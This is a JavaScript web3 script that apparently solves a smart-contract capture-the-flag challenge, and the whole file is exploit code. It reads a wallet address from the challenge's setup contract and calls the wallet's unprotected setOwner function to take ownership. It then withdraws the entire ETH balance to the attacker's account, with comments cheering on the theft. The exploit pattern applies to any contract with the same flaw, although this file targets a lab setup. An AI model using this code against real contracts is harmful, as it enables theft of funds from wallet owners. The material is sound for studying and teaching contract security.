// import data
const challengeData = require("./challenge1.json");
const setupABI = require("./setupABI.json");
const walletABI = require("./walletABI.json");

const ENDPOINT = challengeData["RPC endpoint"];
const SETUPACCT = challengeData["Setup contract"];
const ATTACKPRIKEY = challengeData["Private key"];

// setup
const Web3 = require("web3");

// connect
const web3 = new Web3(ENDPOINT);

async function main() {

	try {
		// get attacker account so I can check my loot
		var ATTACKACCT = await web3.eth.getAccounts();
		ATTACKACCT = ATTACKACCT.toString();
		console.log("My attack account is: " + ATTACKACCT);
		
		// create two new contract objects, one for the setup account, one for the wallet
		console.log("Oh great! An easy exploit! Let's find a mark.");
		const Setup = new web3.eth.Contract(setupABI, SETUPACCT);
		const Wallet = new web3.eth.Contract(walletABI, SETUPACCT);
		
		// exploit the public wallet state variable to get the wallet address
		const MARKACCT = await Setup.methods.wallet().call();
		console.log("Mark account is: " + MARKACCT);
		
		// check to make sure there is enough ETH worth stealing
		console.log("Is there enough money in the mark's account?...");
		await web3.eth.getBalance(MARKACCT, function(err, result) {
			if (err) {
				console.log(err);
			} else if (web3.utils.fromWei(result, "ether") < 10) {
				throw new Error("Not enough money to bother stealing.");
			} else {
				console.log("There's " +  web3.utils.fromWei(result, "ether") + " ETH there! Let's steal it all!");			}
		});
		
		// encode function signatures into byte code
		const WalletSetOwnerEncoded = Wallet.methods.setOwner().encodeABI();
		const WalletWithdrawEncoded = Wallet.methods.withdraw(ATTACKACCT).encodeABI();

		// setup transaction objects
    		const setOwnerTX = {
        		to: MARKACCT,
        		from: ATTACKACCT,
        		data: WalletSetOwnerEncoded,	// target set owner function
		};
    		const withdrawTX = {
        		to: MARKACCT,
        		from: ATTACKACCT,
        		data: WalletWithdrawEncoded,	// target only owner modifier to withdraw
		};
		
		// exploit public set owner function
		await web3.eth.sendTransaction(setOwnerTX, function(error, hash) {
  			if (!error) {
      				console.log("Transaction hash: ", hash);
				console.log("Wallet owner address set to message sender.");
    			} else {
      				console.log("❗Something went wrong while submitting your transaction:", error)
    			}
   		});

		// exploit only owner modifier to withdraw
		await web3.eth.sendTransaction(withdrawTX, function(error, hash) {
  			if (!error) {
      				console.log("Transaction hash: ", hash);
				console.log("Account funds drained to beneficiary (me).");
    			} else {
      				console.log("❗Something went wrong while submitting your transaction:", error)
    			}
   		});

		// check to make sure everything worked
		const isSolved = await Setup.methods.isSolved().call();
		console.log("Exploit success status: " + isSolved);


	} catch (error) {
		
		// catch any random errors
		console.log("Error: " + error);

	}
}

main();


